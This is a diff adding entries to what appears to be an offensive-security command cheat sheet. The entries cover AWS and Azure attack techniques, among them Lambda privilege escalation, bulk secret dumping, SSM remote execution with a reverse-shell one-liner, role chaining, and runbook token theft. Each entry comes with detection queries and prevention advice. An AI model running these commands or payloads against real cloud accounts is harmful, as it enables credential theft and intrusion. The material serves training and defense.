+        "sentinel_kql": "AWSCloudTrail\n| where UserIdentityType == \"AssumedRole\"\n| where SourceIpAddress !startswith \"10.\" and SourceIpAddress !startswith \"172.\"\n| summarize Calls=count(), Events=make_set(EventName) by UserIdentityArn, SourceIpAddress",
+        "sigma_rules": "aws_instance_credential_use_outside_aws",
+        "prevention": "Enforce IMDSv2 and set HttpTokens=required and HttpPutResponseHopLimit=1 on every instance; block egress to 169.254.169.254 from app runtimes that do not need it; scope instance roles to least privilege; enable GuardDuty InstanceCredentialExfiltration detection; fix the SSRF (allowlist outbound hosts, deny link-local ranges).",
+        "sources": [
+          "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/",
+          "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Instance role credentials used from outside AWS",
+            "logic": "index=aws sourcetype=aws:cloudtrail userIdentity.type=AssumedRole\n| stats dc(sourceIPAddress) as srcips values(eventName) as events by userIdentity.arn\n| where srcips>1",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1552.005",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "NAT changes or legitimate use of role creds from multiple instances behind one egress IP",
+            "tuning": "Baseline each instance role's normal source IPs and alert on new external IPs; correlate with GuardDuty InstanceCredentialExfiltration"
+          }
+        ]
+      }
+    },
+    {
+      "id": "aws-lambda-privesc",
+      "name": "AWS Lambda Privesc - UpdateFunctionCode + PassRole",
+      "command": "aws lambda update-function-code --function-name <target> --zip-file fileb://<file>",
+      "description": "Escalate privileges in AWS by abusing Lambda. With lambda:UpdateFunctionCode (or CreateFunction + iam:PassRole) over a function that has a higher-privileged execution role attached, overwrite the code to run attacker commands under that role and exfiltrate its temporary credentials. Lambda environment variables are also a common store of plaintext secrets.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "AWS Attacks",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Rhino Security Labs",
+      "tags": [
+        "aws",
+        "lambda",
+        "privesc",
+        "passrole",
+        "iam",
+        "execution-role"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1098"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE TWO PATHS ===\n  1. Overwrite existing function code (lambda:UpdateFunctionCode) that already\n     has a privileged execution role -> your code runs as that role.\n  2. Create a new function (lambda:CreateFunction + iam:PassRole) and pass a\n     higher-priv role to it -> your code runs as that role.\n\n=== PERMISSIONS ===\n  Path 1: lambda:UpdateFunctionCode (+ lambda:InvokeFunction or a trigger)\n  Path 2: lambda:CreateFunction + iam:PassRole (over the target role)\n\n=== ENUMERATE FUNCTIONS + THEIR ROLES ===\n  aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role}'\n  aws lambda get-function-configuration --function-name <target>\n  # look for env vars holding secrets:\n  aws lambda get-function-configuration --function-name <target> --query 'Environment'\n\n=== PATH 1: HIJACK EXISTING FUNCTION ===\n  # payload (index.py) that leaks the execution-role creds:\n  cat > index.py <<'EOF'\nimport os, json, urllib.request\ndef handler(event, context):\n    c = {k: os.environ[k] for k in os.environ if k.startswith('AWS_')}\n    return json.dumps(c)\nEOF\n  zip func.zip index.py\n  aws lambda update-function-code --function-name <target> --zip-file fileb://func.zip\n  aws lambda invoke --function-name <target> out.json && cat out.json\n  # the AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN in the output are the role's creds\n\n=== PATH 2: NEW FUNCTION WITH PASSED ROLE ===\n  aws lambda create-function --function-name pwn --runtime python3.12 \\\n    --role arn:aws:iam::<acct>:role/<priv_role> --handler index.handler \\\n    --zip-file fileb://func.zip\n  aws lambda invoke --function-name pwn out.json\n\n=== CLEANUP ===\n  Restore original code / delete the planted function.",
+      "examples": [
+        {
+          "label": "List functions and their roles",
+          "command": "aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role}'"
+        },
+        {
+          "label": "Overwrite code to leak role creds",
+          "command": "aws lambda update-function-code --function-name <target> --zip-file fileb://func.zip"
+        },
+        {
+          "label": "Dump secrets from env vars",
+          "command": "aws lambda get-function-configuration --function-name <target> --query 'Environment.Variables'"
+        }
+      ],
+      "references": [
+        {
+          "title": "Rhino Security Labs - AWS IAM privilege escalation methods",
+          "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+        },
+        {
+          "title": "AWS docs - Lambda execution role",
+          "url": "https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-iam-privesc-backdoor",
+          "note": "Related IAM privilege-escalation primitives.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "Enumerate which Lambda/PassRole permissions you hold.",
+          "rel": "prereq"
+        },
+        {
+          "id": "aws-secrets-manager-dump",
+          "note": "Harvest secrets the function can read.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Lambda functions run with an execution role whose temporary credentials are placed in the function's environment. Anyone who can change the code (UpdateFunctionCode) or create a function with a passed role (CreateFunction + PassRole) controls what runs under that role and can read its credentials.",
+        "prerequisites": "IAM permission lambda:UpdateFunctionCode over a privileged function, or lambda:CreateFunction with iam:PassRole over a higher-privileged role; ability to invoke the function or an existing trigger.",
+        "impact": "Privilege escalation to the function's execution-role permissions, theft of its temporary credentials, and exposure of secrets stored in environment variables - often a jump from limited access to administrative IAM.",
+        "detection": "[MITRE T1098] CloudTrail UpdateFunctionCode / CreateFunction / UpdateFunctionConfiguration events from unusual principals; PassRole events pairing a low-priv identity with a high-priv role; invocation spikes right after a code update.",
+        "artifacts": "CloudTrail events UpdateFunctionCode20150331v2, CreateFunction20150331, UpdateFunctionConfiguration, and iam:PassRole in the request context; Lambda deployment history; CloudWatch Logs for the modified function.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=UpdateFunctionCode* OR eventName=CreateFunction* OR eventName=UpdateFunctionConfiguration*)\n| stats count by userIdentity.arn, requestParameters.functionName, sourceIPAddress",
+        "elastic_kql": "event.provider:\"lambda.amazonaws.com\" and aws.cloudtrail.event_name:(UpdateFunctionCode* or CreateFunction* or UpdateFunctionConfiguration*)",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName startswith \"UpdateFunctionCode\" or EventName startswith \"CreateFunction\" or EventName startswith \"UpdateFunctionConfiguration\"\n| summarize Count=count() by UserIdentityArn, SourceIpAddress, EventName",
+        "sigma_rules": "aws_lambda_update_function_code_privesc",
+        "prevention": "Restrict lambda:UpdateFunctionCode/CreateFunction and iam:PassRole with tight resource and iam:PassedToService conditions; separate deployment identities from runtime; never store secrets in Lambda env vars (use Secrets Manager/Parameter Store with KMS); enable code signing for Lambda; alert on function code changes outside CI/CD.",
+        "sources": [
+          "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+          "https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Lambda code/config change followed by invoke (privesc)",
+            "logic": "index=aws sourcetype=aws:cloudtrail eventName IN (UpdateFunctionCode20150331v2, CreateFunction20150331, UpdateFunctionConfiguration20150331v2)\n| stats count values(eventName) as events by userIdentity.arn, requestParameters.functionName, sourceIPAddress",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1098",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate CI/CD deployment roles updating functions",
+            "tuning": "Allowlist deployment pipeline principals; alert when a human/interactive identity updates function code or passes a privileged role"
+          }
+        ]
+      }
+    },
+    {
       "id": "aws-domain-cloud-recon",
       "name": "AWS Pre-Auth Recon - DNS & Cloud Service Discovery",
       "command": "host -t ns <domain>\nhost <ip>\ncloud_enum -k <keyword> --quickscan --disable-azure --disable-gcp",
@@ -14436,6 +15005,320 @@ const COMMAND_DATA = {
       "explain": "Identifies AWS infrastructure before you have any credentials:\n  host -t ns <domain>   NS records ending in awsdns-* confirm Route 53\n  host <ip>             reverse lookups resolving to ec2-*.compute.amazonaws.com confirm EC2 (and the region)\n  cloud_enum -k <keyword> --quickscan --disable-azure --disable-gcp   brute public S3/cloud resources by keyword\nMaps the target's AWS footprint passively so you know what to attack once you get in."
     },
     {
+      "id": "aws-secrets-manager-dump",
+      "name": "AWS Secrets Manager + SSM Parameter Store Dump",
+      "command": "aws secretsmanager get-secret-value --secret-id <target>",
+      "description": "Enumerate and exfiltrate stored secrets across AWS Secrets Manager and SSM Parameter Store. With secretsmanager:ListSecrets/GetSecretValue and ssm:DescribeParameters/GetParameter(s), an attacker harvests database passwords, API keys, OAuth tokens, and other credentials in bulk - a classic post-compromise step that converts limited cloud access into access to downstream systems.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "AWS Attacks",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "hackingthe.cloud",
+      "tags": [
+        "aws",
+        "secrets-manager",
+        "parameter-store",
+        "ssm",
+        "credentials",
+        "exfiltration"
+      ],
+      "mitre": [
+        "T1552.005",
+        "T1555"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PERMISSIONS ===\n  Secrets Manager: secretsmanager:ListSecrets, secretsmanager:GetSecretValue\n  Parameter Store: ssm:DescribeParameters, ssm:GetParameter(s),\n                   ssm:GetParametersByPath (+ kms:Decrypt for SecureString)\n\n=== SECRETS MANAGER - LIST + DUMP ALL ===\n  aws secretsmanager list-secrets --query 'SecretList[].Name'\n  aws secretsmanager get-secret-value --secret-id <target> \\\n    --query SecretString --output text\n  # dump everything:\n  for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do\n    echo \"== $s ==\"; aws secretsmanager get-secret-value --secret-id \"$s\" --query SecretString --output text;\n  done\n\n=== SSM PARAMETER STORE - LIST + DUMP ===\n  aws ssm describe-parameters --query 'Parameters[].Name'\n  aws ssm get-parameter --name <target> --with-decryption --query Parameter.Value --output text\n  # recursive dump of a path (decrypts SecureString):\n  aws ssm get-parameters-by-path --path / --recursive --with-decryption\n\n=== CROSS-REGION ===\n  Secrets are region-scoped; repeat with --region in each enabled region.\n\n=== NEXT ===\n  Use harvested DB/API creds to pivot into application backends.",
+      "examples": [
+        {
+          "label": "List and read one secret",
+          "command": "aws secretsmanager get-secret-value --secret-id <target> --query SecretString --output text"
+        },
+        {
+          "label": "Dump all Parameter Store values decrypted",
+          "command": "aws ssm get-parameters-by-path --path / --recursive --with-decryption"
+        },
+        {
+          "label": "List all secret names",
+          "command": "aws secretsmanager list-secrets --query 'SecretList[].Name'"
+        }
+      ],
+      "references": [
+        {
+          "title": "hackingthe.cloud - Enumerate and read Secrets Manager",
+          "url": "https://hackingthe.cloud/aws/enumeration/loot_public_ebs_snapshots/"
+        },
+        {
+          "title": "AWS docs - GetSecretValue",
+          "url": "https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-pacu-enum",
+          "note": "Enumerate accessible secrets/parameters first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "Confirm GetSecretValue / GetParameter permissions.",
+          "rel": "prereq"
+        },
+        {
+          "id": "aws-lambda-privesc",
+          "note": "Lambda env vars are another secret store to loot.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Secrets Manager and Parameter Store are the sanctioned secret stores, and reading them is a normal API call. An identity granted (often over-broadly) GetSecretValue or GetParameter with kms:Decrypt can read every secret it is allowed to touch, in bulk, with no exploit needed.",
+        "prerequisites": "IAM permissions secretsmanager:GetSecretValue or ssm:GetParameter(s) (ListSecrets/DescribeParameters to enumerate), plus kms:Decrypt on the encrypting key for SecureString/encrypted secrets.",
+        "impact": "Mass theft of stored credentials - database passwords, API keys, tokens - enabling lateral movement into databases, SaaS, and other systems well beyond AWS.",
+        "detection": "[MITRE T1552.005] CloudTrail GetSecretValue / GetParameter(s) / GetParametersByPath at high volume or from unusual principals; BatchGetSecretValue; many distinct secret IDs read by one identity in a short window.",
+        "artifacts": "CloudTrail events GetSecretValue, GetParameters, GetParametersByPath with requestParameters.secretId/names and withDecryption=true; associated kms:Decrypt events on the secret's key.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=GetSecretValue OR eventName=GetParameter OR eventName=GetParameters OR eventName=GetParametersByPath)\n| stats dc(requestParameters.secretId) as nsecrets count by userIdentity.arn, sourceIPAddress\n| where count>10",
+        "elastic_kql": "aws.cloudtrail.event_name:(GetSecretValue or GetParameter or GetParameters or GetParametersByPath)",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName in (\"GetSecretValue\",\"GetParameter\",\"GetParameters\",\"GetParametersByPath\")\n| summarize Reads=count(), Secrets=dcount(tostring(parse_json(RequestParameters).secretId)) by UserIdentityArn, SourceIpAddress\n| where Reads > 10",
+        "sigma_rules": "aws_secrets_mass_retrieval",
+        "prevention": "Scope GetSecretValue/GetParameter to specific secret ARNs per workload; separate KMS keys per sensitivity and restrict kms:Decrypt; enable rotation; alert on bulk or anomalous secret reads; deny human/interactive principals direct GetSecretValue in production; use resource policies on secrets.",
+        "sources": [
+          "https://hackingthe.cloud/aws/enumeration/loot_public_ebs_snapshots/",
+          "https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Bulk secret/parameter retrieval by a single principal",
+            "logic": "index=aws sourcetype=aws:cloudtrail eventName IN (GetSecretValue, GetParameter, GetParameters, GetParametersByPath)\n| bucket _time span=10m\n| stats dc(requestParameters.secretId) as secrets count by _time, userIdentity.arn, sourceIPAddress\n| where count>10",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1552.005",
+              "T1555"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Application roles that legitimately read many secrets at startup",
+            "tuning": "Baseline per-role normal read volume and secret set; alert on new principals or spikes above baseline"
+          }
+        ]
+      }
+    },
+    {
+      "id": "aws-ssm-command-exec",
+      "name": "AWS SSM - Remote Command Exec on Instances (No SSH)",
+      "command": "aws ssm send-command --document-name AWS-RunShellScript --instance-ids <target> --parameters commands=<cmd>",
+      "description": "With ssm:SendCommand or ssm:StartSession permissions, run arbitrary commands on managed EC2 instances through Systems Manager without SSH, open ports, or key material. Commands execute as root (Linux) or SYSTEM (Windows) via the SSM agent, making SSM a powerful lateral-movement and privesc path when an attacker holds the right IAM permissions.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "AWS Attacks",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "hackingthe.cloud",
+      "tags": [
+        "aws",
+        "ssm",
+        "run-command",
+        "session-manager",
+        "lateral-movement",
+        "rce"
+      ],
+      "mitre": [
+        "T1651",
+        "T1078.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PERMISSIONS NEEDED ===\n  ssm:SendCommand  (+ the instance must have the SSM agent + an instance\n  profile with AmazonSSMManagedInstanceCore). For shells: ssm:StartSession.\n\n=== FIND MANAGED INSTANCES ===\n  aws ssm describe-instance-information\n  aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId'\n\n=== RUN A COMMAND (Linux) ===\n  aws ssm send-command --document-name \"AWS-RunShellScript\" \\\n    --instance-ids <target> \\\n    --parameters 'commands=[\"id\",\"whoami\",\"cat /etc/passwd\"]'\n  # get the output:\n  aws ssm list-command-invocations --command-id <id> --details\n\n=== RUN A COMMAND (Windows) ===\n  aws ssm send-command --document-name \"AWS-RunPowerShellScript\" \\\n    --instance-ids <target> --parameters 'commands=[\"whoami\",\"ipconfig\"]'\n\n=== INTERACTIVE SHELL (runs as root/SYSTEM) ===\n  aws ssm start-session --target <target>\n  # needs the session-manager-plugin installed locally\n\n=== REVERSE SHELL ONE-LINER ===\n  aws ssm send-command --document-name AWS-RunShellScript --instance-ids <target> \\\n    --parameters 'commands=[\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"]'\n\n=== NOTES ===\n  - No inbound ports required; all traffic is instance->SSM outbound.\n  - Execution user is root (Linux) / SYSTEM (Windows) via the agent.",
+      "examples": [
+        {
+          "label": "List SSM-managed instances",
+          "command": "aws ssm describe-instance-information --query 'InstanceInformationList[].{Id:InstanceId,OS:PlatformType}'"
+        },
+        {
+          "label": "Run id/whoami on a target",
+          "command": "aws ssm send-command --document-name AWS-RunShellScript --instance-ids <target> --parameters 'commands=[\"id\",\"whoami\"]'"
+        },
+        {
+          "label": "Interactive Session Manager shell",
+          "command": "aws ssm start-session --target <target>"
+        }
+      ],
+      "references": [
+        {
+          "title": "hackingthe.cloud - Survey of SSM abuse",
+          "url": "https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/"
+        },
+        {
+          "title": "AWS docs - Run Command (Systems Manager)",
+          "url": "https://docs.aws.amazon.com/systems-manager/latest/userguide/execute-remote-commands.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-imds-ssrf-creds",
+          "note": "Grab instance creds first, then pivot with SSM.",
+          "rel": "prereq"
+        },
+        {
+          "id": "aws-pacu-enum",
+          "note": "Enumerate which instances and roles you can reach.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "Confirm you hold ssm:SendCommand / StartSession.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-impacket-dcomexec",
+          "note": "On-prem remote-exec analogue; SSM Run Command is the cloud-native equivalent.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "SSM is a legitimate management channel. An identity with ssm:SendCommand or ssm:StartSession can execute on any instance that runs the SSM agent with the core managed-instance policy, as root/SYSTEM, with no network exposure - so stolen IAM credentials become instance code execution.",
+        "prerequisites": "IAM permission ssm:SendCommand (and/or ssm:StartSession), target instances with the SSM agent running and an instance profile granting AmazonSSMManagedInstanceCore.",
+        "impact": "Code execution as root/SYSTEM on arbitrary managed instances; lateral movement across the fleet, credential theft from instances, and data access - all from one IAM principal.",
+        "detection": "[MITRE T1651] CloudTrail ssm:SendCommand / ssm:StartSession events, especially from unusual principals or against many instances; AWS-RunShellScript/AWS-RunPowerShellScript document invocations; new session starts outside change windows.",
+        "artifacts": "CloudTrail events SendCommand, StartSession, with requestParameters.documentName and instanceIds; SSM command history (list-command-invocations); on-host SSM agent logs under /var/log/amazon/ssm/.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=SendCommand OR eventName=StartSession)\n| stats count values(requestParameters.instanceIds{}) as targets by userIdentity.arn, requestParameters.documentName\n| where count>0",
+        "elastic_kql": "event.provider:\"ssm.amazonaws.com\" and aws.cloudtrail.event_name:(SendCommand or StartSession)",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName in (\"SendCommand\",\"StartSession\")\n| extend Doc=tostring(parse_json(RequestParameters).documentName)\n| summarize Count=count() by UserIdentityArn, Doc, SourceIpAddress",
+        "sigma_rules": "aws_ssm_send_command_exec",
+        "prevention": "Restrict ssm:SendCommand/StartSession to specific principals and instance tags via IAM conditions; require Session Manager logging to S3/CloudWatch with KMS; alert on RunShellScript/RunPowerShellScript use; use SSM session preferences to disable root shells and record sessions; least-privilege instance profiles.",
+        "sources": [
+          "https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/",
+          "https://docs.aws.amazon.com/systems-manager/latest/userguide/execute-remote-commands.html"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "SSM remote command execution via RunShellScript/RunPowerShellScript",
+            "logic": "index=aws sourcetype=aws:cloudtrail eventName=SendCommand\n| spath requestParameters.documentName output=doc\n| search doc=\"AWS-RunShellScript\" OR doc=\"AWS-RunPowerShellScript\"\n| stats count dc(requestParameters.instanceIds{}) as instances by userIdentity.arn, sourceIPAddress",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1651"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate automation/patching pipelines that use Run Command",
+            "tuning": "Allowlist known automation roles; alert on SendCommand from interactive/human principals or to many instances at once"
+          }
+        ]
+      }
+    },
+    {
+      "id": "aws-sts-assumerole-chain",
+      "name": "AWS STS AssumeRole Chaining - Pivot Across Roles/Accounts",
+      "command": "aws sts assume-role --role-arn <role_arn> --role-session-name <profile>",
+      "description": "Use sts:AssumeRole to hop from one IAM role to another, chaining across roles and even AWS accounts to reach higher privilege. Over-broad trust policies, wildcard principals, and missing or guessable sts:ExternalId conditions create confused-deputy and cross-account escalation paths. Role chaining also lets an attacker launder their identity and shorten the audit trail.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "AWS Attacks",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "hackingthe.cloud",
+      "tags": [
+        "aws",
+        "sts",
+        "assume-role",
+        "role-chaining",
+        "cross-account",
+        "confused-deputy",
+        "external-id"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1098"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT ENABLES IT ===\n  A role's trust policy (AssumeRolePolicyDocument) lists who may assume it.\n  Over-broad principals ( \"AWS\": \"*\" , a whole account root, or a role you\n  already control) let you assume higher-priv roles, possibly cross-account.\n\n=== FIND ASSUMABLE ROLES ===\n  aws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}'\n  # or enumerate with Pacu / pmapper to graph who-can-assume-what\n\n=== ASSUME A ROLE ===\n  aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<priv_role> \\\n    --role-session-name pivot\n  # export the returned AccessKeyId/SecretAccessKey/SessionToken, then:\n  aws sts get-caller-identity\n\n=== CROSS-ACCOUNT WITH EXTERNAL ID (confused deputy) ===\n  aws sts assume-role --role-arn arn:aws:iam::<other_acct>:role/<role> \\\n    --role-session-name pivot --external-id <external_id>\n  # if the ExternalId is weak/guessable/leaked, the control fails\n\n=== CHAINING (role -> role -> role) ===\n  # assume role A, configure it as a profile, then assume role B from it:\n  aws configure set profile.a.aws_access_key_id ...\n  aws sts assume-role --profile a --role-arn arn:...:role/B --role-session-name b\n  # note: chained sessions are capped at 1 hour\n\n=== USE A NAMED PROFILE (role_arn + source_profile) ===\n  ~/.aws/config:\n    [profile pivot]\n    role_arn = arn:aws:iam::<acct>:role/<priv_role>\n    source_profile = default\n\n=== NEXT ===\n  After landing in the target role, enumerate and look for the next hop.",
+      "examples": [
+        {
+          "label": "Assume a role and check identity",
+          "command": "aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<priv_role> --role-session-name pivot"
+        },
+        {
+          "label": "Cross-account assume with external id",
+          "command": "aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> --role-session-name pivot --external-id <external_id>"
+        },
+        {
+          "label": "List roles and their trust policies",
+          "command": "aws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}'"
+        }
+      ],
+      "references": [
+        {
+          "title": "hackingthe.cloud - IAM privilege escalation / role chaining",
+          "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+        },
+        {
+          "title": "AWS docs - sts:AssumeRole",
+          "url": "https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-pacu-enum",
+          "note": "Graph who-can-assume-what before chaining.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "Enumerate role trust policies for weak principals.",
+          "rel": "prereq"
+        },
+        {
+          "id": "aws-lambda-privesc",
+          "note": "Alternative IAM privesc once you hold a role.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AssumeRole is governed entirely by the target role's trust policy. When that policy names an over-broad principal (account root, wildcard, or a role the attacker controls) or relies on a weak/guessable ExternalId, an attacker can legitimately assume a more privileged role, including across accounts.",
+        "prerequisites": "Control of a principal that is trusted by the target role (directly or via a chain), plus sts:AssumeRole; for cross-account confused-deputy, knowledge of (or absence of) the required ExternalId.",
+        "impact": "Privilege escalation and cross-account/cross-boundary movement; attacker obtains the target role's permissions and can continue chaining toward administrative access while obscuring their original identity.",
+        "detection": "[MITRE T1078.004] CloudTrail AssumeRole events where the assuming identity is itself an assumed-role session (chaining), cross-account AssumeRole from unexpected source accounts/IPs, or a burst of AssumeRole calls walking multiple roles.",
+        "artifacts": "CloudTrail AssumeRole events with userIdentity.type=AssumedRole as the caller, requestParameters.roleArn, requestParameters.externalId, and resources showing the target role; sts:GetCallerIdentity probes.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail eventName=AssumeRole\n| stats count values(requestParameters.roleArn) as roles dc(requestParameters.roleArn) as nroles by userIdentity.arn, sourceIPAddress\n| where nroles>2",
+        "elastic_kql": "event.provider:\"sts.amazonaws.com\" and aws.cloudtrail.event_name:\"AssumeRole\" and aws.cloudtrail.user_identity.type:\"AssumedRole\"",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName == \"AssumeRole\"\n| where UserIdentityType == \"AssumedRole\"\n| summarize Roles=dcount(tostring(parse_json(RequestParameters).roleArn)), Calls=count() by UserIdentityArn, SourceIpAddress\n| where Roles > 2",
+        "sigma_rules": "aws_sts_assumerole_chaining",
+        "prevention": "Scope every role trust policy to specific principals (no account-root or wildcard); require a strong unique sts:ExternalId for third-party cross-account roles; add aws:SourceArn/aws:SourceAccount conditions; use permission boundaries and SCPs to cap reachable privilege; alert on role chaining and unexpected cross-account AssumeRole.",
+        "sources": [
+          "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/",
+          "https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "STS role chaining / cross-account AssumeRole",
+            "logic": "index=aws sourcetype=aws:cloudtrail eventName=AssumeRole userIdentity.type=AssumedRole\n| stats dc(requestParameters.roleArn) as roles values(requestParameters.roleArn) as chain by userIdentity.arn, sourceIPAddress\n| where roles>2",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1078.004",
+              "T1098"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate automation that chains roles (CI/CD, cross-account tooling)",
+            "tuning": "Baseline normal role-assumption graphs per principal; alert on new cross-account targets or chains deeper than expected"
+          }
+        ]
+      }
+    },
+    {
       "id": "azure-authentication",
       "name": "Azure Authentication (az / Az PowerShell / Mg Graph)",
       "command": "az login --service-principal -u <app_id> -p <secret> --tenant <tenant_id>",
@@ -14621,6 +15504,318 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Authenticates to Azure/Entra as a compromised service principal:\n  az login --service-principal   non-interactive SP login\n  -u <app_id> -p <secret>        the app's client id and secret\n  --tenant <tenant_id>           the directory to sign into\nEstablishes a session for ARM/Entra enumeration; interactive 'az login' (or --use-device-code) works for user creds, and 'az account get-access-token' extracts a bearer token for raw API calls."
+    },
+    {
+      "id": "azure-automation-runbook-abuse",
+      "name": "Azure Automation Runbook Abuse - RunAs / Managed Identity",
+      "command": "az automation runbook create --automation-account-name <target> --resource-group <share> --name <profile> --type PowerShell",
+      "description": "Abuse an Azure Automation Account for privilege escalation and credential theft. With rights over an Automation Account, create or edit a runbook that executes under the account's attached managed identity (or legacy RunAs service principal), then use that identity's often-elevated RBAC role to act across the subscription or to extract stored credentials, variables, and connection secrets.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "NetSPI / Microsoft docs",
+      "tags": [
+        "azure",
+        "automation",
+        "runbook",
+        "managed-identity",
+        "runas",
+        "privesc",
+        "persistence"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1651"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  An Automation Account can have a system/user-assigned managed identity\n  (or a legacy RunAs SP) with RBAC roles - frequently Contributor on the\n  subscription. A runbook you control runs AS that identity.\n\n=== PERMISSIONS ===\n  Automation Contributor (or write over runbooks) on the Automation Account.\n\n=== ENUMERATE ===\n  az automation account list -o table\n  az automation runbook list --automation-account-name <target> -g <share>\n  # stored assets that often hold secrets:\n  az automation variable list --automation-account-name <target> -g <share>\n  az automation credential list --automation-account-name <target> -g <share>\n\n=== PLANT A RUNBOOK THAT USES THE MANAGED IDENTITY ===\n  cat > pwn.ps1 <<'EOF'\nConnect-AzAccount -Identity\n# now acting as the Automation Account's managed identity:\n$t = (Get-AzAccessToken -ResourceUrl 'https://management.azure.com/').Token\nWrite-Output $t\nGet-AzRoleAssignment | Out-String\nEOF\n  az automation runbook create --automation-account-name <target> -g <share> \\\n    --name <profile> --type PowerShell\n  az automation runbook replace-content --automation-account-name <target> \\\n    -g <share> --name <profile> --content @pwn.ps1\n  az automation runbook publish --automation-account-name <target> -g <share> --name <profile>\n  az automation runbook start --automation-account-name <target> -g <share> --name <profile>\n  # read the job output to recover the token / results\n\n=== IMPACT ===\n  Token for the managed identity -> ARM/Graph as that SP; add role\n  assignments, read key vaults it can reach, persist via a scheduled runbook.",
+      "examples": [
+        {
+          "label": "List automation accounts and runbooks",
+          "command": "az automation runbook list --automation-account-name <target> -g <share> -o table"
+        },
+        {
